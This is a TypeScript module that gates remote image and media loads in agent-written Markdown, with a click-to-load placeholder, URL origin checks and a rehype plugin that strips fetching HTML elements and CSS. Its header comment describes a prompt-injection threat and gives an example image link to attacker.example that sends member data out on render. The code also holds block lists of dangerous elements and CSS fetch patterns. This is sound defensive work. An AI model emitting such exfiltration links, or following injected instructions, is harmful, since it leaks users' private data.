/**
 * Media in agent-authored Markdown — the one gate for a remote fetch.
 *
 * THE THREAT. An agent's reply is text an attacker can steer: a prompt
 * injection in an email, a web page, an uploaded file or a task description
 * the agent reads. A reply that ends with
 * `![](https://attacker.example/p.png?d=<member data>)` makes the member's
 * browser send that data out the moment the bubble renders. No tool runs and
 * no card shows. The app has no CSP that limits `img-src`.
 *
 * THE RULE. A URL that would leave the app's origin does not load on render.
 * `MarkdownImage` draws it as a placeholder that names the host, and only a
 * member's click loads it. A `data:` URI, a `blob:` URL and a same-origin
 * path (the workspace file proxy that `resolveMediaSrc` builds) load at once.
 * A same-origin URL that carries an absolute URL in its query string counts as
 * remote: `/api/email/image-proxy?url=…` fetches any public URL server-side,
 * so the data still leaves.
 *
 * Every Markdown renderer of agent content consumes this module:
 * `MarkdownBody` (the chat bubble, the generative-UI markdown node, meeting
 * notes), `ThinkingContainer`, `ArtifactViewerModal` and `DocumentPane`. The
 * two that allow raw HTML (`rehype-raw`) also run `rehypeGateRemoteMedia`.
 *
 * Fences: `src/lib/markdownMedia.test.ts` and
 * `src/components/markdownImage.test.ts`.
 */

import { defaultUrlTransform } from "react-markdown";

// ─── Workspace path resolver ─────────────────────────────────────────────────

/**
 * Rewrite an image src found inside Markdown so it routes through the gateway
 * file proxy.
 *
 * Rules (in priority order):
 *  1. A full URL (http/https/data:) → unchanged. `remoteHost` gates it.
 *  2. No session context            → unchanged (it cannot be resolved).
 *  3. An absolute path (`/…`)       → workspace-root-relative, proxied.
 *  4. A relative path               → resolved against the directory of
 *                                     `mdFilePath`, then proxied.
 */
export function resolveMediaSrc(
  src: string,
  sessionId: string | undefined,
  mdFilePath: string | undefined,
): string {
  if (/^(https?:|data:)/i.test(src)) return src;
  if (!sessionId) return src;

  let workspacePath: string;
  if (src.startsWith("/")) {
    workspacePath = src.replace(/^\/+/, "");
  } else if (mdFilePath) {
    const mdDir = mdFilePath.includes("/")
      ? mdFilePath.substring(0, mdFilePath.lastIndexOf("/"))
      : "";
    const parts = (mdDir ? `${mdDir}/${src}` : src).split("/");
    const resolved: string[] = [];
    for (const part of parts) {
      if (part === "..") resolved.pop();
      else if (part !== ".") resolved.push(part);
    }
    workspacePath = resolved.join("/");
  } else {
    workspacePath = src;
  }

  return `/api/agent/workspace/${sessionId}/file?path=${encodeURIComponent(workspacePath)}`;
}

// ─── Is this URL remote? ─────────────────────────────────────────────────────

/** The origin a relative URL resolves against when there is no window (SSR,
 *  the node test run). `.invalid` is reserved, so it never names a real host. */
const NO_WINDOW_ORIGIN = "https://app.invalid";

/** The app's own origin, read at call time. */
export function appOrigin(): string {
  return typeof window !== "undefined" && window.location?.origin
    ? window.location.origin
    : NO_WINDOW_ORIGIN;
}

/** The label a placeholder shows when the address does not parse. */
export const UNKNOWN_HOST = "an unknown address";

/** An absolute URL inside a query value: `https://…`, or `//host…`. */
function embeddedHost(value: string): string | null {
  const candidates = [value];
  try {
    candidates.push(decodeURIComponent(value));
  } catch {
    // A malformed escape: the raw value is the only candidate.
  }
  for (const c of candidates) {
    const v = c.trim();
    if (!/^(https?:|\/\/|\\\\)/i.test(v)) continue;
    try {
      return new URL(v, NO_WINDOW_ORIGIN).host || UNKNOWN_HOST;
    } catch {
      return UNKNOWN_HOST;
    }
  }
  return null;
}

/**
 * The host a src would make the browser contact, when that is NOT the app
 * itself — or `null` when the src is safe to load at once.
 *
 * Safe: a `data:` URI, a `blob:` URL, and a same-origin URL whose query
 * carries no absolute URL. Everything else is remote, including a scheme
 * the browser would not load (it costs one click, never a leak). Parsing
 * uses the WHATWG `URL`, the same parser the browser fetches with, so
 * `//host`, `/\host`, a leading space and an upper-case scheme all land
 * where the browser would send them.
 */
export function remoteHost(src: string, origin: string = appOrigin()): string | null {
  let url: URL;
  try {
    url = new URL(src, `${origin}/`);
  } catch {
    return UNKNOWN_HOST;
  }
  if (url.protocol === "data:" || url.protocol === "blob:") return null;
  if (url.protocol !== "http:" && url.protocol !== "https:") {
    return url.host || UNKNOWN_HOST;
  }
  if (url.origin !== origin) return url.host || UNKNOWN_HOST;
  // Same origin. A proxy route still sends the data out if its query names
  // another URL (`/api/email/image-proxy?url=…`).
  for (const value of url.searchParams.values()) {
    const host = embeddedHost(value);
    if (host) return host;
  }
  return null;
}

// ─── The member's choice ─────────────────────────────────────────────────────
//
// Which remote URLs a member chose to load. Memory only and keyed by the exact
// URL: a click on one image never allows another, and nothing is written to
// storage, so a reload asks again. It is a store rather than component state so
// that a bubble that remounts (a streamed message saved, a session switched)
// does not ask twice for the same URL.

const allowedRemote = new Set<string>();
const listeners = new Set<() => void>();

/** The member clicked "Load image" for this URL. */
export function allowRemoteImage(src: string): void {
  if (allowedRemote.has(src)) return;
  allowedRemote.add(src);
  for (const l of listeners) l();
}

export function isRemoteImageAllowed(src: string): boolean {
  return allowedRemote.has(src);
}

export function subscribeRemoteImages(listener: () => void): () => void {
  listeners.add(listener);
  return () => {
    listeners.delete(listener);
  };
}

/** Forget every choice. For tests. */
export function resetRemoteImages(): void {
  allowedRemote.clear();
}

// ─── URL transform ───────────────────────────────────────────────────────────

/**
 * react-markdown's `urlTransform`, plus one case: a `data:image/…` src on an
 * `img`. The default transform blanks every `data:` URL, so before this a
 * data image drew as a broken frame. A data URI makes no request, so it has
 * nothing to gate. Every other URL takes the default (which also blanks
 * `javascript:`).
 */
export function markdownUrlTransform(
  url: string,
  key: string,
  node: { tagName?: string },
): string {
  if (key === "src" && node.tagName === "img" && /^data:image\//i.test(url.trim())) {
    return url;
  }
  return defaultUrlTransform(url);
}

// ─── The raw-HTML gate (rehype) ──────────────────────────────────────────────

interface HastNode {
  type: string;
  tagName?: string;
  properties?: Record<string, unknown>;
  children?: HastNode[];
}

/** Elements removed with their content. Each one fetches, runs, restyles the
 *  host page or moves the document (React 19 hoists `link`, `meta`, `title`
 *  and an async `script` into the head and loads them). A `template` holds
 *  its content where this walk does not look, and React would build it. */
const DROPPED_ELEMENTS = new Set([
  "script", "style", "link", "meta", "base", "title", "template",
  "iframe", "frame", "frameset", "object", "embed", "applet", "portal",
]);

/** SVG animation can rewrite an `href` to a remote URL after the gate ran. */
const ANIMATION_ELEMENTS = new Set(["set", "animate"]);

/** Properties whose value is one URL the browser fetches without a click.
 *  `href` and `xLinkHref` are here too, except on `a` and `area`. */
const FETCH_URL_PROPS = [
  "src", "poster", "background", "data", "lowsrc", "dynsrc", "icon",
  "href", "xLinkHref",
];

/** Properties whose value is a list of `url descriptor` candidates. */
const SRCSET_PROPS = ["srcSet", "imageSrcSet"];

/** CSS that can fetch without a `url(…)` this check can read, or that hides
 *  one behind an escape (`\75 rl(`). */
const CSS_FETCH = /image-set|cross-fade|\bimage\s*\(|\belement\s*\(|\bsrc\s*\(|@import|expression\s*\(|\\/i;

/** True when a `url(…)` names anything but a same-document fragment. */
function hasFetchingUrl(value: string): boolean {
  for (const m of value.matchAll(/url\s*\(\s*(['"]?)([^'")]*)/gi)) {
    if (!m[2].trim().startsWith("#")) return true;
  }
  return false;
}

function srcsetIsRemote(value: string): boolean {
  return value
    .split(",")
    .map((candidate) => candidate.trim().split(/\s+/)[0] ?? "")
    .some((url) => url !== "" && remoteHost(url) !== null);
}

function gateElement(node: HastNode): void {
  const tag = node.tagName ?? "";
  const props = node.properties;
  if (!props) return;
  const clickOnlyHref = tag === "a" || tag === "area";

  for (const key of FETCH_URL_PROPS) {
    const value = props[key];
    if (typeof value !== "string") continue;
    // `img` keeps its src: `MarkdownImage` draws the placeholder for it.
    if (key === "src" && tag === "img") continue;
    if ((key === "href" || key === "xLinkHref") && clickOnlyHref) continue;
    if (remoteHost(value) !== null) delete props[key];
  }

  for (const key of SRCSET_PROPS) {
    const value = props[key];
    if (typeof value === "string" && srcsetIsRemote(value)) delete props[key];
  }

  for (const [key, value] of Object.entries(props)) {
    if (typeof value !== "string") continue;
    if (key === "style" && CSS_FETCH.test(value)) {
      delete props[key];
      continue;
    }
    // `style`, and the SVG paint attributes (`fill`, `filter`, `mask`,
    // `cursor` …), take `url(…)`. Only a fragment (`url(#grad)`) stays.
    if (hasFetchingUrl(value)) delete props[key];
  }
}

function dropsElement(node: HastNode): boolean {
  const tag = node.tagName ?? "";
  if (DROPPED_ELEMENTS.has(tag)) return true;
  if (ANIMATION_ELEMENTS.has(tag)) {
    const target = String(node.properties?.attributeName ?? "");
    return /href|src/i.test(target);
  }
  return false;
}

function gateTree(node: HastNode): void {
  if (!node.children) return;
  node.children = node.children.filter(
    (child) => !(child.type === "element" && dropsElement(child)),
  );
  for (const child of node.children) {
    if (child.type === "element") gateElement(child);
    gateTree(child);
  }
}

/**
 * The rehype plugin for a renderer that runs `rehype-raw`. Put it AFTER
 * `rehype-raw`, which is what turns an HTML string into elements this can see.
 *
 * It removes what fetches, runs or restyles the host page (`DROPPED_ELEMENTS`),
 * and strips every remote URL a browser would fetch on render from what is
 * left: `src`, `poster`, `background`, `data`, `srcset`, an `href` that is not
 * a link's, and a CSS `url(…)` in a `style` or an SVG attribute. An `img`
 * keeps its src for `MarkdownImage`, which draws the click-to-load
 * placeholder. A link keeps its `href`, because following it needs a click.
 */
export function rehypeGateRemoteMedia() {
  return (tree: unknown) => {
    gateTree(tree as HastNode);
  };
}
